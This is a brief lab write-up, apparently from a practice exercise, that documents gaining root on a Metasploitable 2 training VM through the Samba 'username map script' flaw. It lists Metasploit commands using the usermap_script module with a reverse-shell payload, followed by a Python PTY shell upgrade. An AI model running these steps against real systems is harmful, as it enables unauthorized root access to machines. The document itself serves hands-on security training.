# Challenge: Remote Root Access (Samba)

  Target: Metasploitable 2 (IP: 172.17.0.2)

  Vulnerability Type: Remote Code Execution (RCE)

  Service: Samba (Port 445)

  Description: Exploited the "Username Map Script" vulnerability in Samba versions 3.0.20 through 3.0.25rc3. This allows remote attackers to execute arbitrary commands by specifying a username containing shell meta-characters.

## Steps to Reproduce:

  Reconnaissance: Ran netstat -ant on the target to confirm port 445 (Microsoft-DS) was in a LISTEN state.

  Exploit Selection: Loaded the following module in Metasploit:

        use exploit/multi/samba/usermap_script

### Configuration:

        set RHOSTS 172.17.0.2

        set PAYLOAD cmd/unix/reverse

  Execution: Ran exploit.

## Post-Exploitation:

  Verified identity: whoami (Result: root).

  Stabilized shell using Python PTY: python -c 'import pty; pty.spawn("/bin/bash")'.

## 3. Evidence Collection

I collected information to show that im root and what i can have access to as root.
<img width="1366" height="768" alt="Screenshot_20251223_114025" src="https://github.com/user-attachments/assets/762476d0-7b20-4dcc-9c47-974bb2d9afba" />
